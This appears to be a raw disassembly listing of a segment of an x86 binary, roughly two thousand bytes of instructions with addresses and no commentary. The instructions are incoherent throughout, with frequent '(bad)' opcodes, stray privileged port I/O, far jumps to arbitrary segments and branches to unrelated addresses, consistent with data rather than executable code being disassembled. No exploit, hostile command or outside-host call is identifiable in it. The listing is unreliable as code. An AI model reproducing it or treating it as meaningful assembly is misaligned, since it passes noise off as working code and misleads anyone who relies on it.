  49f7a3:	or     DWORD PTR [ecx],ebx
  49f7a5:	outs   dx,BYTE PTR ds:[esi]
  49f7a6:	(bad)  
  49f7a7:	xor    BYTE PTR [edx+0xa],dh
  49f7aa:	or     BYTE PTR [ecx],bh
  49f7ac:	ja     0x49f753
  49f7ae:	pop    ebp
  49f7af:	add    eax,0xebd0a408
  49f7b4:	sbb    al,0x1c
  49f7b6:	inc    ecx
  49f7b7:	out    0xe6,al
  49f7b9:	out    0x4a,al
  49f7bb:	inc    esi
  49f7bc:	leave  
  49f7bd:	jmp    0x49f7cc
  49f7bf:	popa   
  49f7c0:	jb     0x49f7f9
  49f7c2:	data16 ja 0x49f7f7
  49f7c5:	or     edi,DWORD PTR [eax-0x69]
  49f7c8:	mov    DWORD PTR [ecx+0x470e013e],ebp
  49f7ce:	dec    eax
  49f7cf:	(bad)  
  49f7d0:	fcom   st(0)
  49f7d2:	ja     0x49f7b6
  49f7d4:	cmp    edi,0x8
  49f7d7:	jl     0x49f797
  49f7d9:	jmp    0x436c:0x45811261
  49f7e0:	add    bl,BYTE PTR [edi+0x42]
  49f7e3:	inc    ecx
  49f7e4:	bound  eax,QWORD PTR [ecx]
  49f7e6:	(bad)  
  49f7e7:	and    BYTE PTR [ecx],bh
  49f7e9:	add    DWORD PTR fs:[edi-0x20e7a4f9],0x63
  49f7f1:	xchg   esi,eax
  49f7f2:	push   es
  49f7f3:	inc    edi
  49f7f4:	pop    ss
  49f7f5:	arpl   WORD PTR [eax],cx
  49f7f7:	popf   
  49f7f8:	sub    DWORD PTR [eax-0x50],edx
  49f7fb:	ror    DWORD PTR [eax],cl
  49f7fd:	push   ss
  49f7fe:	xor    BYTE PTR [ebp+0x78],cl
  49f801:	jmp    FWORD PTR [eax]
  49f803:	xor    DWORD PTR [edx+0x5a8d5f23],edi
  49f809:	add    DWORD PTR [esp+ebp*4],ecx
  49f80c:	pop    edx
  49f80d:	push   0xffffffb3
  49f80f:	and    DWORD PTR [esi+0x5f41167f],ecx
  49f815:	sti    
  49f816:	inc    ebx
  49f817:	sbb    ah,ch
  49f819:	sub    al,0x36
  49f81b:	jmp    0x7d443338
  49f820:	out    0x8a,al
  49f822:	repz imul esp,DWORD PTR [eax-0x4a],0x737804ec
  49f82a:	clc    
  49f82b:	lea    eax,[eax-0x2d]
  49f82e:	inc    eax
  49f82f:	test   eax,0x46411cb4
  49f834:	jae    0x49f82e
  49f836:	pop    ss
  49f837:	sbb    BYTE PTR [edx+0x661cc15b],bl
  49f83d:	ja     0x49f7fb
  49f83f:	test   eax,0x37808885
  49f844:	sbb    al,0x16
  49f846:	adc    BYTE PTR [eax+0x4004d98a],dl
  49f84c:	dec    edi
  49f84d:	imul   ebx,DWORD PTR [eax+0xc5a8813],0xc44426ed
  49f857:	sub    dh,bl
  49f859:	mov    al,0x7c
  49f85b:	pushf  
  49f85c:	jmp    0x49f7e5
  49f85e:	fnstcw WORD PTR [ecx-0x78f255ee]
  49f864:	nop
  49f865:	mov    DWORD PTR [eax-0x49],edi
  49f868:	push   cs
  49f869:	sbb    dl,BYTE PTR ss:[ecx+0x3]
  49f86d:	xor    al,0x9c
  49f86f:	or     BYTE PTR [ecx+0x5f0860b0],dl
  49f875:	das    
  49f876:	add    BYTE PTR ds:0x20abedc7,cl
  49f87c:	inc    esp
  49f87d:	mov    ax,WORD PTR [ebx+esi*2]
  49f881:	push   es
  49f882:	dec    esp
  49f883:	jae    0x49f887
  49f885:	sbb    bl,BYTE PTR fs:[edi]
  49f888:	daa    
  49f889:	inc    edx
  49f88a:	mov    esp,0x95fa9a1e
  49f88f:	xor    BYTE PTR [esi],dl
  49f891:	(bad)  
  49f893:	ret    0x6651
  49f896:	pop    eax
  49f897:	xor    ebx,eax
  49f899:	jle    0x49f8a8
  49f89b:	xor    BYTE PTR [eax],ah
  49f89d:	mov    esi,0xf0558a9c
  49f8a3:	mov    ds:0x4e4182c1,al
  49f8a8:	and    al,0x50
  49f8aa:	fsubr  DWORD PTR es:[esi+0x17]
  49f8ae:	je     0x49f86c
  49f8b0:	pop    esi
  49f8b1:	pop    edi
  49f8b2:	stc    
  49f8b3:	pop    esi
  49f8b4:	mov    ecx,0x287c240b
  49f8b9:	mov    esp,0xfcb95b94
  49f8be:	mov    esi,0xe9087e34
  49f8c3:	or     DWORD PTR [ecx],0x26f3dcee
  49f8c9:	inc    BYTE PTR [ebx-0x40]
  49f8cc:	enter  0x4f3a,0xff
  49f8d0:	mov    DWORD PTR [ebx],0xcc780030
  49f8d6:	and    DWORD PTR [eax],esi
  49f8d8:	sub    eax,0x3251782e
  49f8dd:	push   es
  49f8de:	jae    0x49f8f1
  49f8e0:	mov    ah,0xc0
  49f8e2:	xchg   ecx,eax
  49f8e3:	and    BYTE PTR [esi],ch
  49f8e5:	add    eax,0xaa0c5e7c
  49f8ea:	dec    eax
  49f8eb:	cmp    bl,BYTE PTR [esi]
  49f8ed:	psllq  mm6,mm0
  49f8f0:	inc    edx
  49f8f1:	xor    al,0x53
  49f8f3:	fwait
  49f8f4:	or     eax,DWORD PTR [edx+0x54]
  49f8f7:	push   ebp
  49f8f8:	fcom   QWORD PTR [esi+0x2]
  49f8fb:	dec    esp
  49f8fc:	nop    DWORD PTR [ecx+eiz*8]
  49f900:	test   BYTE PTR [edx+eiz*1],0x44
  49f904:	inc    ebp
  49f905:	fdiv   st(1),st
  49f907:	add    al,0x90
  49f909:	out    dx,eax
  49f90a:	gs jecxz 0x49f956
  49f90d:	jns    0x49f8d0
  49f90f:	mov    ecx,0x5e5f04bb
  49f914:	pop    ebx
  49f915:	cmp    BYTE PTR [esi+0xa],al
  49f918:	pop    esi
  49f919:	sbb    edx,DWORD PTR [edi]
  49f91b:	leave  
  49f91c:	dec    ebx
  49f91d:	dec    ebx
  49f91e:	sub    edi,DWORD PTR [ecx]
  49f920:	and    dl,BYTE PTR [eax]
  49f922:	fs ins DWORD PTR es:[edi],dx
  49f924:	addr16 jmp 0x174947eb
  49f92a:	sbb    ecx,DWORD PTR [ebp-0x43f018b5]
  49f930:	jl     0x49f8ed
  49f932:	jns    0x49f913
  49f934:	outs   dx,BYTE PTR ds:[esi]
  49f935:	xor    al,0xf
  49f937:	lods   al,BYTE PTR ds:[esi]
  49f938:	ror    dh,1
  49f93a:	mov    DWORD PTR [ebx+ecx*2],edi
  49f93d:	shr    edx,0xc6
  49f940:	call   0x1ca9bb50
  49f945:	shl    DWORD PTR [ecx+0x730c6d8d],0xac
  49f94c:	je     0x49f954
  49f94e:	mov    ebp,esp
  49f950:	lods   al,BYTE PTR ds:[esi]
  49f951:	or     al,0x78
  49f953:	aaa    
  49f954:	rcl    DWORD PTR [ecx-0x4f],0xa7
  49f958:	or     eax,0x61b12329
  49f95d:	stos   BYTE PTR es:[edi],al
  49f95e:	inc    edi
  49f95f:	(bad)
  49f963:	std    
  49f964:	mov    eax,DWORD PTR [esi]
  49f966:	jbe    0x49f9af
  49f968:	mov    bl,dl
  49f96a:	add    eax,0x1a74f719
  49f96f:	jge    0x49f9ad
  49f971:	out    dx,al
  49f972:	and    al,0x11
  49f974:	push   ss
  49f975:	ss mov edi,0xb016557d
  49f97b:	xor    ecx,DWORD PTR [esi+ecx*1]
  49f97e:	and    al,0x4f
  49f980:	adc    DWORD PTR [eax],0x4e
  49f983:	fsub   DWORD PTR [eax+edx*8-0x1a]
  49f987:	jno    0x49f9b7
  49f989:	xchg   ebp,eax
  49f98a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49f98b:	aam    0xd0
  49f98d:	push   esi
  49f98e:	(bad)  
  49f98f:	(bad)  [ebp-0x68]
  49f992:	rol    eax,0xea
  49f995:	ds in  eax,dx
  49f997:	push   ebx
  49f998:	adc    al,0x1a
  49f99a:	into   
  49f99b:	dec    edi
  49f99c:	stos   BYTE PTR es:[edi],al
  49f99d:	(bad)  
  49f99e:	jnp    0x49f9c4
  49f9a0:	xchg   edi,eax
  49f9a1:	retf   
  49f9a2:	cmp    BYTE PTR [edi],ah
  49f9a4:	iret   
  49f9a5:	dec    ebx
  49f9a6:	aad    0xf5
  49f9a8:	push   esi
  49f9a9:	push   eax
  49f9aa:	daa    
  49f9ab:	mov    BYTE PTR [ebx],cl
  49f9ad:	les    ecx,FWORD PTR [esi+0x47]
  49f9b0:	pop    ss
  49f9b1:	or     eax,0x4a8ebaaa
  49f9b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49f9b7:	adc    esp,DWORD PTR [edx+ebx*2]
  49f9ba:	push   es
  49f9bb:	jne    0x49f98b
  49f9bd:	or     ebp,DWORD PTR [ebx+eax*8+0x7a2c3064]
  49f9c4:	mov    bl,BYTE PTR [edx]
  49f9c6:	mov    DWORD PTR ss:[ebx],ecx
  49f9c9:	hlt    
  49f9ca:	enter  0xd88,0x49
  49f9ce:	adc    DWORD PTR [eax+0xb],edi
  49f9d1:	dec    ebx
  49f9d2:	jo     0x49f9d4
  49f9d4:	xlat   BYTE PTR ds:[ebx]
  49f9d5:	bound  ebp,QWORD PTR ds:0x81db105c
  49f9db:	stc    
  49f9dc:	adc    esi,DWORD PTR [edx]
  49f9de:	add    esp,DWORD PTR [edi]
  49f9e0:	inc    ecx
  49f9e1:	popa   
  49f9e2:	jl     0x49f9ac
  49f9e4:	hlt    
  49f9e5:	add    ecx,DWORD PTR [ebp+0x6]
  49f9e8:	push   0x1f814022
  49f9ed:	sti    
  49f9ee:	clc    
  49f9ef:	sbb    BYTE PTR [esi+0x70120703],0x81
  49f9f6:	es test ecx,esi
  49f9f9:	inc    ebx
  49f9fa:	(bad)  
  49f9fb:	outs   dx,BYTE PTR ds:[esi]
  49f9fc:	mov    ds:0x36b2080,al
  49fa01:	mov    edx,0x44363185
  49fa06:	sbb    BYTE PTR [ebx],al
  49fa08:	dec    edi
  49fa09:	add    BYTE PTR [eax],bh
  49fa0b:	cwde   
  49fa0c:	mov    dl,0x9a
  49fa0e:	pop    es
  49fa0f:	pop    ecx
  49fa10:	sbb    BYTE PTR [esi+0x185e20c6],ch
  49fa16:	pop    edi
  49fa17:	inc    eax
  49fa18:	push   0xffffffc3
  49fa1a:	popf   
  49fa1b:	cmp    eax,0xad60121f
  49fa20:	cdq    
  49fa21:	mov    dh,0xcc
  49fa23:	xor    dl,BYTE PTR [esi+0x35]
  49fa26:	pop    ecx
  49fa27:	cdq    
  49fa28:	xchg   ebx,eax
  49fa29:	mov    al,ds:0xc2b3f431
  49fa2e:	mov    eax,ds:0xee09482f
  49fa33:	fstp   DWORD PTR [eax]
  49fa35:	loopne 0x49f9c1
  49fa37:	mov    ch,0xc0
  49fa39:	lods   eax,DWORD PTR ds:[esi]
  49fa3a:	sbb    BYTE PTR [ecx],dh
  49fa3c:	or     ch,cl
  49fa3e:	add    DWORD PTR [esp+esi*8],0x68
  49fa42:	sub    al,0x0
  49fa44:	and    eax,0x810f8c3c
  49fa49:	xchg   edi,eax
  49fa4a:	jbe    0x49fa95
  49fa4c:	loopne 0x49f9e4
  49fa4e:	iret   
  49fa4f:	lock and edx,DWORD PTR [edx+0x3e]
  49fa53:	loope  0x49f9dc
  49fa55:	or     DWORD PTR [ecx+0x1d],esp
  49fa58:	arpl   WORD PTR [eax],sp
  49fa5a:	mov    esi,0x1e0e6a11
  49fa5f:	dec    edx
  49fa60:	rcr    BYTE PTR [ebx],0xa
  49fa63:	loopne 0x49fa65
  49fa65:	repz or al,0xf0
  49fa68:	add    al,bh
  49fa6a:	xchg   esi,eax
  49fa6b:	fldenv [ebp+0x78669d50]
  49fa71:	jns    0x49fae1
  49fa73:	add    al,0x22
  49fa75:	call   0x862accd
  49fa7a:	jmp    0xb645:0xe23c5856
  49fa81:	repz cmp dx,WORD PTR [eax+0x2d]
  49fa86:	rol    BYTE PTR [ebx],0xa9
  49fa89:	adc    al,0x83
  49fa8b:	mov    cl,BYTE PTR [ebp+0x75b0f758]
  49fa91:	cdq    
  49fa92:	jp     0x49fa3c
  49fa94:	into   
  49fa95:	push   eax
  49fa96:	mov    ds:0x9fb75ad7,eax
  49fa9b:	fs je  0x49fb06
  49fa9e:	push   edi
  49fa9f:	(bad)
  49faa3:	sbb    eax,0x5c0d9945
  49faa8:	or     al,0x39
  49faaa:	inc    edx
  49faab:	inc    eax
  49faac:	stos   DWORD PTR es:[edi],eax
  49faad:	jmp    0x8bd7:0x5689d413
  49fab4:	or     eax,0x6b2849fe
  49fab9:	adc    esi,edi
  49fabb:	or     eax,0x3b015342
  49fac0:	adc    eax,0x1ba01a2c
  49fac5:	or     edi,DWORD PTR [edx+ebx*8+0x53]
  49fac9:	push   es
  49faca:	push   ss
  49facb:	sub    BYTE PTR [esi+ebp*1+0x6a],dh
  49facf:	or     eax,DWORD PTR fs:[edi*1-0x3c89aeb4]
  49fad7:	push   cs
  49fad8:	call   0x7288:0x11680860
  49fadf:	(bad)  
  49fae0:	xor    al,0xeb
  49fae2:	or     eax,0x145fb604
  49fae7:	jnp    0x49fa74
  49fae9:	sbb    DWORD PTR [ebx],0xffffff98
  49faec:	inc    edx
  49faed:	xor    eax,0x35251ea
  49faf2:	and    DWORD PTR [eax+0x25],0xffffffd6
  49faf6:	outs   dx,BYTE PTR ds:[esi]
  49faf7:	add    DWORD PTR [ebx],edx
  49faf9:	xchg   esp,eax
  49fafa:	cs ins DWORD PTR es:[edi],dx
  49fafc:	leave  
  49fafd:	or     cl,BYTE PTR [edi-0x6e]
  49fb00:	jne    0x49fb1d
  49fb02:	mov    dl,0x3e
  49fb04:	or     ah,BYTE PTR [edi-0x1e]
  49fb07:	mov    BYTE PTR [ebp+0xe],dh
  49fb0a:	std    
  49fb0b:	lsl    ebp,bp
  49fb0e:	xor    edi,DWORD PTR [eax+ebp*8-0x2]
  49fb12:	(bad)  
  49fb14:	ins    DWORD PTR es:[edi],dx
  49fb15:	mov    edi,DWORD PTR ds:0x50ca6594
  49fb1b:	shl    BYTE PTR [eax],1
  49fb1d:	pop    es
  49fb1e:	rcr    DWORD PTR [esi],cl
  49fb20:	mov    al,ds:0x985da6f1
  49fb25:	dec    eax
  49fb26:	cld    
  49fb27:	dec    esp
  49fb28:	fdivr  QWORD PTR [esi]
  49fb2a:	mov    dh,0x59
  49fb2c:	and    esi,DWORD PTR [esi]
  49fb2e:	fnstcw WORD PTR [ebp+0xa]
  49fb31:	dec    eax
  49fb32:	xor    al,0x8
  49fb34:	(bad)  
  49fb35:	sub    BYTE PTR [ebx],0x4e
  49fb38:	jle    0x49fb55
  49fb3a:	mov    ch,0x71
  49fb3c:	pop    es
  49fb3d:	jno    0x49fb27
  49fb3f:	loopne 0x49fb99
  49fb41:	fild   QWORD PTR [ebp-0x20]
  49fb44:	(bad)  
  49fb45:	inc    BYTE PTR [esp+esi*1-0x27f3f5a6]
  49fb4c:	popa   
  49fb4d:	cld    
  49fb4e:	fdivp  st(1),st
  49fb50:	fmul   QWORD PTR ds:0x87e86640
  49fb56:	xor    al,0x8e
  49fb58:	ins    DWORD PTR es:[edi],dx
  49fb59:	cld    
  49fb5a:	fistp  QWORD PTR [ebp-0x7c]
  49fb5d:	int    0x8a
  49fb5f:	or     BYTE PTR [ebp+0x4c0a10f8],dh
  49fb65:	mov    bl,0xe3
  49fb67:	push   esi
  49fb68:	pop    edx
  49fb69:	jle    0x49fb7b
  49fb6b:	cmp    ebp,0x2e021075
  49fb71:	push   eax
  49fb72:	fbld   TBYTE PTR [eax+0x3c2e000c]
  49fb78:	aad    0x7a
  49fb7a:	int3   
  49fb7b:	push   ebx
  49fb7c:	push   esp
  49fb7d:	ja     0x49fb7d
  49fb7f:	mov    ebp,0x46060460
  49fb84:	add    BYTE PTR [ecx+0x5081862e],0x88
  49fb8b:	lock sbb al,0x39
  49fb8e:	cmp    ch,BYTE PTR [edx]
  49fb90:	popa   
  49fb91:	add    DWORD PTR ds:0x4c1ea5be,0x90b1850d
  49fb9b:	fcom   QWORD PTR [eax+0x0]
  49fb9e:	push   cs
  49fb9f:	inc    eax
  49fba0:	lea    ecx,[eax]
  49fba2:	nop
  49fba3:	add    edx,DWORD PTR [ebp-0x6f924cfb]
  49fba9:	add    ecx,eax
  49fbab:	push   esp
  49fbac:	jg     0x49fbfe
  49fbae:	and    al,0xe
  49fbb0:	mov    al,0xdf
  49fbb2:	xor    al,0x88
  49fbb4:	sbb    al,0x3b
  49fbb6:	iret   
  49fbb7:	jge    0x49fc02
  49fbb9:	mov    eax,edi
  49fbbb:	dec    ebp
  49fbbc:	iret   
  49fbbd:	jle    0x49fbb1
  49fbbf:	fild   WORD PTR [edi]
  49fbc1:	fidiv  WORD PTR [eax+0x39891c4d]
  49fbc7:	pop    edi
  49fbc8:	sahf   
  49fbc9:	jle    0x49fb99
  49fbcb:	mov    eax,ecx
  49fbcd:	sub    eax,esi
  49fbcf:	push   0x2b173e0d
  49fbd4:	jge    0x49fb86
  49fbd6:	push   ds
  49fbd7:	mov    al,0x94
  49fbd9:	mov    esp,0x7eae98ab
  49fbde:	sub    al,BYTE PTR [edx-0x39]
  49fbe1:	(bad)  
  49fbe2:	shr    BYTE PTR [edx+edx*8-0x64],cl
  49fbe6:	bound  edx,QWORD PTR [eax+edi*1-0x73f5e906]
  49fbed:	shl    DWORD PTR [ebx],cl
  49fbef:	arpl   WORD PTR [edi+0x68],dx
  49fbf2:	rcr    BYTE PTR [edi+0x62],1
  49fbf5:	sub    eax,0xffb629fc
  49fbfa:	sbb    dl,BYTE PTR [eax+0x6a]
  49fbfd:	js     0x49fc4f
  49fbff:	push   eax
  49fc00:	shl    BYTE PTR [ebx+edx*2+0x64a431e1],0x5a
  49fc08:	pop    esi
  49fc09:	dec    ecx
  49fc0a:	xor    esi,DWORD PTR [ecx+0x6808b29f]
  49fc10:	int3   
  49fc11:	pusha  
  49fc12:	push   edi
  49fc13:	jmp    0x11dba3a0
  49fc18:	dec    eax
  49fc19:	aad    0xe7
  49fc1b:	retf   0xc45
  49fc1e:	mov    cl,0x88
  49fc20:	adc    esp,DWORD PTR [edx-0x39]
  49fc23:	or     eax,0xe22ce203
  49fc28:	cmp    al,0x26
  49fc2a:	pop    esi
  49fc2b:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49fc2d:	fbstp  TBYTE PTR [edi+0x6a551fac]
  49fc33:	sub    BYTE PTR [eax],cl
  49fc35:	push   ebx
  49fc36:	or     eax,0x9f2ca1b5
  49fc3b:	aas    
  49fc3c:	mov    bl,0x9a
  49fc3e:	jecxz  0x49fc63
  49fc40:	jb     0x49fcaa
  49fc42:	push   0xe330077d
  49fc47:	dec    esi
  49fc48:	add    esi,DWORD PTR [esi+0x16]
  49fc4b:	xor    dl,BYTE PTR [ebp-0x32c5f528]
  49fc51:	pop    esp
  49fc52:	push   ss
  49fc53:	repnz in al,dx
  49fc55:	add    DWORD PTR [edx],eax
  49fc57:	inc    esi
  49fc58:	js     0x49fc23
  49fc5a:	mov    WORD PTR [eax],?
  49fc5c:	cdq    
  49fc5d:	popa   
  49fc5e:	inc    eax
  49fc5f:	cmp    eax,0x332ffb7e
  49fc64:	sti    
  49fc65:	and    BYTE PTR [edi+eax*2+0x8],dh
  49fc69:	inc    eax
  49fc6a:	je     0x49fcc1
  49fc6c:	test   bl,0xb
  49fc6f:	stc    
  49fc70:	push   ebx
  49fc71:	mov    ah,0x17
  49fc73:	cmp    BYTE PTR ds:0xc98f6856,al
  49fc79:	sub    BYTE PTR [ebx*1+0x64346bad],dl
  49fc80:	mov    ecx,0xa2b16c9d
  49fc85:	icebp  
  49fc86:	dec    eax
  49fc87:	(bad)  
  49fc88:	hlt    
  49fc89:	out    dx,al
  49fc8a:	dec    ebp
  49fc8b:	mov    dh,0xcc
  49fc8d:	or     cl,bl
  49fc8f:	pop    esp
  49fc90:	jl     0x49fcb2
  49fc92:	aaa    
  49fc93:	lock inc eax
  49fc95:	pusha  
  49fc96:	pop    es
  49fc97:	fld    DWORD PTR [edx+0x50c023cc]
  49fc9d:	sbb    eax,0x1e9870f0
  49fca2:	out    0x98,eax
  49fca4:	inc    ecx
  49fca5:	lea    eax,[ebp-0x4fca3598]
  49fcab:	pop    es
  49fcac:	test   DWORD PTR [ecx],0xc0b43601
  49fcb2:	lock or al,0x10
  49fcb5:	int    0x6e
  49fcb7:	mov    bl,0xc6
  49fcb9:	(bad)  
  49fcba:	sub    esi,ebp
  49fcbc:	(bad)  
  49fcbd:	and    esp,esp
  49fcbf:	xor    bl,BYTE PTR [eax]
  49fcc1:	push   eax
  49fcc2:	mov    dh,BYTE PTR [edx+ecx*2-0x1fb3ad6b]
  49fcc9:	adc    edi,DWORD PTR [edx-0x5c]
  49fccc:	(bad)  
  49fccd:	cmp    al,0x62
  49fccf:	push   es
  49fcd0:	cmp    DWORD PTR [eax],edx
  49fcd2:	je     0x49fcdd
  49fcd4:	push   edx
  49fcd5:	mov    al,ds:0xb892c8fa
  49fcda:	inc    edx
  49fcdb:	and    eax,0x18a52370
  49fce0:	sbb    ch,BYTE PTR [eax-0x50]
  49fce3:	sub    al,0xc8
  49fce5:	mov    ds:0xe15742c5,al
  49fcea:	stos   BYTE PTR es:[edi],al
  49fceb:	int3   
  49fcec:	daa    
  49fced:	sbb    bh,BYTE PTR [edi+0x6a26232c]
  49fcf3:	add    al,0xbb
  49fcf5:	cdq    
  49fcf6:	inc    esi
  49fcf7:	dec    edx
  49fcf8:	out    0xcb,eax
  49fcfa:	or     al,0xb2
  49fcfc:	nop
  49fcfd:	add    eax,0x2cdcced7
  49fd02:	test   edi,ecx
  49fd04:	or     al,0x8
  49fd06:	es mov eax,0x46a0171
  49fd0c:	retf   0x224c
  49fd0f:	scas   al,BYTE PTR es:[edi]
  49fd10:	xchg   esp,eax
  49fd11:	xchg   esi,eax
  49fd12:	xor    BYTE PTR [edi+0xbb0216],bl
  49fd18:	icebp  
  49fd19:	sbb    al,0xab
  49fd1b:	add    edx,DWORD PTR [ebx-0x26]
  49fd1e:	dec    edx
  49fd1f:	sahf   
  49fd20:	fistp  QWORD PTR [edi+0xc]
  49fd23:	xlat   BYTE PTR ds:[ebx]
  49fd24:	test   BYTE PTR [esi+0x743d5118],al
  49fd2a:	jae    0x49fcec
  49fd2c:	adc    al,al
  49fd2e:	test   BYTE PTR [ecx],ch
  49fd30:	fisubr DWORD PTR [ecx+0xa]
  49fd33:	jmp    0x49fd61
  49fd35:	or     ecx,edi
  49fd37:	mov    dl,0xf
  49fd39:	add    BYTE PTR [edi-0x4b481e9b],bl
  49fd3f:	ret    0x3f02
  49fd42:	jb     0x49fd2d
  49fd44:	and    ebx,DWORD PTR [esi+0x20]
  49fd47:	push   esp
  49fd48:	cli    
  49fd49:	or     DWORD PTR [ebx+0x3374614],edx
  49fd4f:	cdq    
  49fd50:	sub    BYTE PTR [ebx],0x61
  49fd53:	popa   
  49fd54:	or     bh,al
  49fd56:	pusha  
  49fd57:	add    eax,0x40223102
  49fd5c:	adc    bh,BYTE PTR [eax-0x30]
  49fd5f:	xchg   esi,eax
  49fd60:	dec    ebx
  49fd61:	retf   
  49fd62:	jle    0x49fd7b
  49fd64:	add    al,0x2
  49fd66:	out    dx,eax
  49fd67:	mov    bl,0x72
  49fd69:	inc    ebp
  49fd6a:	repnz lea eax,[edi+ecx*1-0x349f9877]
  49fd72:	xchg   ebp,eax
  49fd73:	push   ebx
  49fd74:	imul   ecx,edx,0x18496cf1
  49fd7a:	mov    bh,0x2d
  49fd7c:	add    bh,BYTE PTR [ebx+0x19169780]
  49fd82:	push   0x1f
  49fd84:	test   eax,0xaf56a78f
  49fd89:	and    al,0x53
  49fd8b:	rol    BYTE PTR [ebx+ebx*2-0x19411b0],cl
  49fd92:	lea    edi,[ebp+0x1b23403b]
  49fd98:	popf   
  49fd99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49fd9a:	push   0x5c
  49fd9c:	loope  0x49fdcc
  49fd9e:	xchg   BYTE PTR [ecx],dl
  49fda0:	scas   al,BYTE PTR es:[edi]
  49fda1:	fisttp QWORD PTR [ecx+0x53a51f70]
  49fda7:	out    0x56,al
  49fda9:	call   0xf257a1b
  49fdae:	inc    esi
  49fdaf:	and    eax,0x3dd88a10
  49fdb4:	or     BYTE PTR [ebx+ebx*8-0x1f726f7b],al
  49fdbb:	xchg   edx,eax
  49fdbc:	adc    eax,0x9487cacf
  49fdc1:	rol    DWORD PTR [ecx],0xec
  49fdc4:	ins    DWORD PTR es:[edi],dx
  49fdc5:	xor    al,0x83
  49fdc7:	shr    BYTE PTR [edx],1
  49fdc9:	pop    eax
  49fdca:	mov    al,BYTE PTR [edi+esi*4-0x1efd22c]
  49fdd1:	inc    ebx
  49fdd2:	push   0x2a
  49fdd4:	push   eax
  49fdd5:	xor    edx,DWORD PTR [eax]
  49fdd7:	xor    ebx,ebx
  49fdd9:	jecxz  0x49fdf6
  49fddb:	dec    edx
  49fddc:	or     BYTE PTR [ecx-0x71],0xef
  49fde0:	ja     0x49fd92
  49fde2:	fimul  WORD PTR [ecx+eax*1]
  49fde5:	jp     0x49fdc4
  49fde7:	sub    dh,BYTE PTR [esi]
  49fde9:	add    edx,DWORD PTR [edi+eax*2]
  49fdec:	pop    ecx
  49fded:	mov    edx,0x4e2d855
  49fdf2:	jb     0x49fe16
  49fdf4:	jns    0x49fe3c
  49fdf6:	arpl   WORD PTR cs:0x1e15c208,cx
  49fdfd:	rcr    bh,cl
  49fdff:	jg     0x49fdef
  49fe01:	push   ds
  49fe02:	inc    edx
  49fe03:	ds cmp eax,0x2584429
  49fe09:	inc    ebx
  49fe0a:	inc    esi
  49fe0b:	xor    BYTE PTR [ebp-0x16],dh
  49fe0e:	add    al,0xc2
  49fe10:	bound  edx,QWORD PTR [ebx]
  49fe12:	or     al,0x79
  49fe14:	add    ch,BYTE PTR [edx]
  49fe16:	cmc    
  49fe17:	xlat   BYTE PTR ds:[ebx]
  49fe18:	xor    cl,bl
  49fe1a:	or     BYTE PTR ds:0xc53089e,bl
  49fe20:	jb     0x49fe68
  49fe22:	rol    BYTE PTR ds:0x844094b4,0xe7
  49fe29:	mov    edx,0xb06ae1af
  49fe2f:	add    al,0x71
  49fe31:	mov    bl,0x1
  49fe33:	push   eax
  49fe34:	test   al,0x82
  49fe36:	mov    edx,DWORD PTR [ebx]
  49fe38:	or     BYTE PTR [edi+0x2e],al
  49fe3b:	inc    edx
  49fe3c:	(bad)  [esi-0x7ae822d0]
  49fe42:	pop    ebx
  49fe43:	sub    dl,BYTE PTR [eax]
  49fe45:	dec    edx
  49fe46:	xor    al,0x22
  49fe48:	or     bh,BYTE PTR [eax]
  49fe4a:	clc    
  49fe4b:	or     DWORD PTR [ebp-0x68],edi
  49fe4e:	cmp    BYTE PTR [ecx],0x85
  49fe51:	enter  0x1060,0x35
  49fe55:	sbb    BYTE PTR [edx-0x7d6f678f],dl
  49fe5b:	push   esi
  49fe5c:	xchg   DWORD PTR [edi+eiz*2-0x28],edi
  49fe60:	pop    ecx
  49fe61:	mov    cl,0x61
  49fe63:	(bad)  
  49fe64:	mov    esi,0x169eefa0
  49fe69:	into   
  49fe6a:	jbe    0x49feca
  49fe6c:	mov    ax,0x2ef3
  49fe70:	shl    bh,1
  49fe72:	mov    ebp,0x77daed97
  49fe77:	es fdiv st(1),st
  49fe7a:	lods   al,BYTE PTR ds:[esi]
  49fe7b:	icebp  
  49fe7c:	push   edi
  49fe7d:	sub    DWORD PTR [ebp+0x5143dcac],edi
  49fe83:	lea    edx,[ebp+0x2ebe5652]
  49fe89:	pop    eax
  49fe8a:	(bad)  
  49fe8c:	popf   
  49fe8d:	add    ebp,DWORD PTR [eax]
  49fe8f:	cmp    WORD PTR [ebp-0x51e98a61],si
  49fe96:	imul   BYTE PTR [ecx+0x77]
  49fe99:	mov    bh,0xed
  49fe9b:	outs   dx,DWORD PTR ds:[esi]
  49fe9c:	out    0x3c,eax
  49fe9e:	xchg   edx,eax
  49fe9f:	cmp    al,0xa2
  49fea1:	ficomp WORD PTR [ecx+0x38]
  49fea4:	or     BYTE PTR [edi],dl
  49fea6:	sbb    eax,0x2de95a4f
  49feab:	dec    eax
  49feac:	shl    BYTE PTR [ebp+0x19114551],1
  49feb2:	pusha  
  49feb3:	mov    bh,0x6c
  49feb5:	inc    ebx
  49feb6:	mov    eax,0x65f5c4a2
  49febb:	push   ecx
  49febc:	push   edx
  49febd:	or     ecx,esp
  49febf:	js     0x49fe72
  49fec1:	jno    0x49fe9d
  49fec3:	rcr    DWORD PTR es:[edx+0x28],0xe8
  49fec8:	sti    
  49fec9:	jnp    0x49feec
  49fecb:	cmp    BYTE PTR [edi],ch
  49fecd:	lods   al,BYTE PTR ds:[esi]
  49fece:	icebp  
  49fecf:	lahf   
  49fed0:	cmp    esi,DWORD PTR [eax+0x435d1770]
  49fed6:	xor    BYTE PTR [esi+0x2a0079bd],ah
  49fedc:	xchg   ebp,eax
  49fedd:	dec    edi
  49fede:	ja     0x49ff47
  49fee0:	mov    bh,0x42
  49fee2:	out    0xb2,eax
  49fee4:	lods   eax,DWORD PTR ds:[esi]
  49fee5:	jmp    0x49ff08
  49fee7:	inc    esp
  49fee8:	mov    al,ds:0x792b7b6f
  49feed:	inc    esp
  49feee:	daa    
  49feef:	aad    0xc5
  49fef1:	and    eax,0x46c82d55
  49fef6:	out    dx,al
  49fef7:	dec    ebp
  49fef8:	aas    
  49fef9:	pop    es
  49fefa:	inc    edi
  49fefb:	sbb    cl,ah
  49fefd:	scas   eax,DWORD PTR es:[edi]
  49fefe:	call   0xecfa0723
  49ff03:	in     al,0xf9
  49ff05:	sbb    DWORD PTR [ecx],0xffffffe7
  49ff08:	and    al,ah
  49ff0a:	mul    esi
  49ff0c:	stos   DWORD PTR es:[edi],eax
